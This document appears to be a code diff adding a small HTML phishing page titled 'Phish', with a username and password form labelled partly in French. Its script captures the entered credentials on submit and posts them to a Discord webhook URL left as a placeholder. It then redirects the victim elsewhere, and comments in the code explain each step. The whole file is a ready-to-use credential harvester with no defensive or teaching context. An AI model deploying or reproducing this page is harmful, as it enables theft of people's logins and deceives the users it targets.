@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Phish</title>
+</head>
+<body>
+    <form id="form">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username">
+      
+        <label for="password">Mot de passe</label>
+        <input type="password" id="password" name="password">
+      
+        <button type="submit">Envoyer</button>
+    </form>
+    <script>
+        function getData() {
+            var username = document.getElementById("username").value;
+            var password = document.getElementById("password").value;
+            return {
+                username: username,
+                password: password
+            }
+        }
+        //put the discord webhook URL here
+        const discordWebhook = "webhookURL";
+        const form = document.getElementById('form');
+        form.addEventListener('submit', function(event) {
+        event.preventDefault();
+        fetch(discordWebhook,
+            {
+                method: 'post',
+                headers: {
+                'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                // Webhook username
+                username: "webhook username",
+                // URL de la photo de profil
+                avatar_url:
+                    '',
+                // Content of message
+                content:
+                    `Here is the username : ${getData().username} and here is the password : ${getData().password}`,
+                }),
+            });
+            //Redirect victim to another website
+            window.location.replace("https://anotherwebsite.com");
+        })
+    </script>
+</body>
+</html>
